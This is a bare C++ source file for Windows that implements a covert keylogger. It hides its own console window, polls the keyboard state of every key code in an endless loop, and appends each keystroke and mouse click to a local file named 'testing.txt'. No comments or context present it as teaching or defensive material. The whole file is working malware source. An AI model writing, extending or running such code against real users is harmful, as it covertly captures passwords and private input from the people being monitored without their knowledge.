#include<iostream>
#include <string>
#include<conio.h>
#include<fstream>
#include<windows.h>
std::string check(int a)
{
	switch (a)
	{
	case VK_CAPITAL: return " [captical] ";
	case VK_SHIFT: return " [shift] ";
	case VK_RETURN: return " [enter] ";
	case VK_LBUTTON: return " [Lclick] ";
	case VK_RBUTTON: return " [Rclick] ";
	}
	return "";
}
int main(){
	   
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::string s,ss;
	std::fstream op; 
	while (true)
	{
		for (int x = 1; x <= 190; x++)
		{
			   
			if (GetAsyncKeyState(x) == -32767)
			{
				op.open("testing.txt", std::ios_base::app);
				std::string s = check(x);

				if (check(x).size()) {
					op << s;
				}
				else {
					if (GetAsyncKeyState(VK_SHIFT))
						op << (char)x;
					else
					op << (char)tolower((char)x);
				}
				op.close();
			}
		}
	}
	   
	return 0;
}

